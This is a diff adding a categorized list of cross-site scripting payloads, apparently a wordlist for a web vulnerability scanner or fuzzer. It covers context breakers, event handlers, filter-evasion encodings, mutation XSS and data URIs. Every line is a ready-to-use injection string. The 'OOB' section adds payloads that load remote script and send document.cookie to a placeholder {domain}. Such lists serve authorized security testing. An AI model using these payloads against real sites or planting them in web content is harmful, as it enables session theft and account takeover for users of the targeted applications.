@@ -1,0 +1,58 @@
+##XSS - Math (1337 reflected via context breakers)##
+"'`><script>alert(1337)</script>
+"'`><img src=x onerror=alert(1337)>
+"'`><svg/onload=alert(1337)>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1337) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1337)//>\x3e
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert(1337)//>
+-->'"/></sCript><deTailS open x=">" ontoggle=(alert)(1337)>
+"><img src=x onerror=alert(1337)>
+'><img src=x onerror=alert(1337)>
+"><svg onload=alert(1337)>
+'><svg onload=alert(1337)>
+`><svg onload=alert(1337)>
+</script><svg onload=alert(1337)>
+</title><svg onload=alert(1337)>
+</textarea><svg onload=alert(1337)>
+</style><svg onload=alert(1337)>
+" autofocus onfocus=alert(1337) x="
+' autofocus onfocus=alert(1337) x='
+" onclick=alert(1337) "
+' onclick=alert(1337) '
+javascript:alert(1337)
+javascript:alert(1337)//
+##XSS - Error (event handlers)##
+<body onload=alert(1337)>
+<input onfocus=alert(1337) autofocus>
+<marquee onstart=alert(1337)>
+<video src=x onerror=alert(1337)>
+<audio src=x onerror=alert(1337)>
+<details open ontoggle=alert(1337)>
+<object data="javascript:alert(1337)">
+<embed src="javascript:alert(1337)">
+<iframe src="javascript:alert(1337)">
+<math><maction actiontype="statusline#" xlink:href="javascript:alert(1337)">1337</maction></math>
+##XSS - Error (filter evasion)##
+<ScRiPt>alert(1337)</ScRiPt>
+<scr<script>ipt>alert(1337)</scr</script>ipt>
+<svg/onload=alert(1337)>
+<svg onload=alert&#40;1337&#41;>
+<svg onload=alert&#x28;1337&#x29;>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1337&#41;">
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1337)>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1337)">click</a>
+<img src=x onerror=alert(1337)//
+##XSS - Math (template literal / backtick)##
+${alert(1337)}
+`${alert(1337)}`
+##XSS - OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+'"><img src=x onerror="fetch('//{domain}/'+document.cookie);alert(1337)"><svg/onload=fetch('//{domain}/')><!--
+--></script>'"><img src=x onerror="new Image().src='//{domain}/?c='+document.cookie;alert(1337)"><!--
+##XSS - Error (DOM clobbering)##
+<form id="x"><input name="action" value="javascript:alert(1337)"></form>
+##XSS - Error (mutation XSS)##
+<noscript><p title="</noscript><img src=x onerror=alert(1337)>">
+##XSS - Error (data URI)##
+<a href="data:text/html,<script>alert(1337)</script>">click</a>
+##XSS - Math (SVG)##
+<svg><script>alert(1337)</script></svg>
